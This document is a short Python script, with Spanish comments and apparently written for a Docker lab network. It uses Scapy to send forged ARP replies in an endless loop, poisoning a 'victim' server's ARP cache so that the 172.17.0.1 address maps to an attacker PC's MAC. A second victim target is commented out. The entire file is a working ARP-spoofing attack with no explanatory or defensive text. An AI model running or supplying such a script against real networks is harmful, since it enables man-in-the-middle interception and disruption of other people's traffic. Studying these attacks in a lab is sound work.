from scapy.all import *

#        MAC            IP

# 02:42:6e:ed:a3:29 172.17.0.1	Cliente
# 02:42:ac:11:00:02 172.17.0.2	Server
# dc:85:de:df:80:25 192.168.0.11	PC



ipDest = "172.17.0.1"
MacPc = "dc:85:de:df:80:25"

ipVictima1 = "172.17.0.2"
hwVictima1 = "02:42:ac:11:00:02"

#ipVictima2 = "172.17.0.3"
#hwVictima2 = "02:42:ac:11:00:03"

send(ARP(op=2,hwsrc=MacPc,psrc=ipDest,pdst=ipVictima1,hwdst=hwVictima1),loop=1,inter=0.2)

#send(ARP(op=2,hwsrc="30:c9:ab:98:28:e7",psrc=ipDest,pdst=ipVictima2,hwdst=hwVictima2),loop=1,inter=0.2)
